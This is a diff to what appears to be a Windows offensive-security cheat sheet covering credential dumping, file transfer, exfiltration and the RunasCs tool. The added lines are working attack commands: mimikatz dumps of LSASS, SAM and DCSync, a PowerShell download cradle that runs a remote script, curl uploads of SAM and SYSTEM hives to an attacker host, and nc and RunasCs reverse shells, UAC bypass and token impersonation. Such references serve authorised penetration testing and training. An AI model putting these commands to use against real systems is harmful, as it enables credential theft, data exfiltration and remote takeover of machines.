@@ -29,12 +29,12 @@ reg query HKCU /f password /t REG_SZ /s
 
 Dumps credentials from LSASS: requires SYSTEM or SeDebugPrivilege. Wdigest is often disabled on modern systems but worth checking.
 
-```bash wrap
-.\mimikatz.exe
-sekurlsa::logonpasswords
-sekurlsa::wdigest
-lsadump::sam
-lsadump::dcsync /user:administrator
+```powershell wrap
+.\mimikatz.exe "sekurlsa::logonpasswords" "exit"
+.\mimikatz.exe "sekurlsa::wdigest" "exit"
+.\mimikatz.exe "lsadump::sam" "exit"
+.\mimikatz.exe "lsadump::dcsync /user:administrator" "exit"
+.\mimikatz.exe "token::elevate" "lsadump::sam" "exit"
 ```
 
 ## File Transfer
@@ -42,9 +42,95 @@ lsadump::dcsync /user:administrator
 Multiple options depending on what's available: PowerShell download cradle works almost everywhere, certutil is a reliable fallback.
 
 ```powershell wrap
-IEX(New-Object Net.WebClient).downloadString('http://<IP>/shell.ps1')
-Invoke-WebRequest -Uri http://<IP>/file -OutFile file
-certutil -urlcache -f http://<IP>/file file
+IEX(New-Object Net.WebClient).downloadString('http://$LHOST/shell.ps1')
+Invoke-WebRequest -Uri http://$LHOST/file -OutFile file
+certutil -urlcache -f http://$LHOST/file file
 # SMB: impacket-smbserver share . -smb2support
-copy \\<IP>\share\file .
+copy \\$LHOST\share\file .
 ```
+
+### Exfiltrate Files (Upload to Attacker)
+
+Start `uploadserver` on the attacker machine, then push files from the target using `curl.exe`.
+
+```bash wrap
+# Attacker: start upload receiver
+python3 -m uploadserver 4444
+```
+
+```powershell wrap
+# Target: upload one or more files
+curl.exe -F "files=@C:\Windows\Temp\SAM" http://$LHOST:4444/upload
+curl.exe -F "files=@C:\Windows\Temp\SAM" -F "files=@C:\Windows\Temp\SYSTEM" http://$LHOST:4444/upload
+```
+
+## RunasCs
+
+Run commands under a different user account with explicit credentials. More flexible than the built-in `runas.exe`: supports different logon types, CreateProcess functions, and output redirection to a remote host. Useful for lateral movement when you have credentials for a local or domain user but no shell as that user.
+
+### Common Usage
+
+<Tabs>
+  <Tab title="PowerShell">
+    ```powershell wrap
+    # Load the module
+    Import-Module ./Invoke-RunasCs.ps1
+
+    # Run a command as a local user
+    Invoke-RunasCs -Username $USER -Password $PASSWORD -Command 'whoami /all'
+
+    # Run as a domain user
+    Invoke-RunasCs -Username $USER -Password $PASSWORD -Domain $DOMAIN -Command 'whoami /all'
+
+    # Background reverse shell (ProcessTimeout 0 = fire and forget, no output wait)
+    Invoke-RunasCs -Username $USER -Password $PASSWORD -ProcessTimeout 0 `
+      -Command 'powershell.exe -enc $B64_PAYLOAD'
+
+    # Redirect stdin/stdout/stderr to a remote listener
+    Invoke-RunasCs -Username $USER -Password $PASSWORD -Command 'cmd.exe' -Remote '$LHOST:4444'
+
+    # Simulate runas /netonly (logon type 9: creds used for network auth only, local identity unchanged)
+    Invoke-RunasCs -Username $USER -Password $PASSWORD -Domain '.' -Command 'whoami' -LogonType 9
+
+    # UAC bypass (spawn unfiltered elevated process)
+    Invoke-RunasCs -Username $USER -Password $PASSWORD -Command 'cmd /c whoami /priv' -BypassUac
+    ```
+  </Tab>
+  <Tab title="EXE">
+    ```cmd wrap
+    :: Run a command as a local user
+    RunasCs.exe $USER $PASSWORD "cmd /c whoami /all"
+
+    :: Run as a domain user with NetworkCleartext logon (type 8)
+    RunasCs.exe $USER $PASSWORD "cmd /c whoami /all" -d $DOMAIN -l 8
+
+    :: Background process (no output): reverse shell or beacon
+    RunasCs.exe $USER $PASSWORD "C:\Temp\nc.exe $LHOST 4444 -e cmd.exe" -t 0
+
+    :: Redirect stdin/stdout/stderr to a remote listener
+    RunasCs.exe $USER $PASSWORD cmd.exe -r $LHOST:4444
+
+    :: Simulate runas /netonly (logon type 9)
+    RunasCs.exe $USER $PASSWORD "cmd /c whoami /all" -l 9
+
+    :: UAC bypass
+    RunasCs.exe $USER $PASSWORD "cmd /c whoami /priv" --bypass-uac
+
+    :: Remote impersonation (assign logged-on user token to main thread)
+    RunasCs.exe $USER $PASSWORD "cmd /c echo admin > C:\Windows\admin" -l 8 --remote-impersonation
+    ```
+  </Tab>
+</Tabs>
+
+### Flags Reference
+
+| Flag | EXE short | Description |
+|------|-----------|-------------|
+| `-Domain` / `--domain` | `-d` | Domain of the user. Leave blank for local accounts. |
+| `-LogonType` / `--logon-type` | `-l` | Logon type for the new process token. `2` = Interactive (default), `8` = NetworkCleartext, `9` = NewCredentials (netonly). |
+| `-ProcessTimeout` / `--timeout` | `-t` | How long (ms) to wait for output. `0` = background process, no output collected. Default: `120000`. |
+| `-Remote` / `--remote` | `-r` | Redirect stdin/stdout/stderr to `host:port`. Sets timeout to 0 automatically. |
+| `-Function` / `--function` | `-f` | CreateProcess function: `0` = CreateProcessAsUserW, `1` = CreateProcessWithTokenW, `2` = CreateProcessWithLogonW. Auto-selected when omitted. |
+| `-ForceProfile` / `--force-profile` | `-p` | Force creation of the user profile. Ensures correct environment variables. Creates `C:\Users\<user>` if missing. |
+| `-BypassUac` / `--bypass-uac` | `-b` | Attempt UAC bypass to get an unfiltered elevated token. |
+| `-RemoteImpersonation` / `--remote-impersonation` | `-i` | Spawn process and assign the logged-on user's token to the main thread instead of creating a new logon session. |
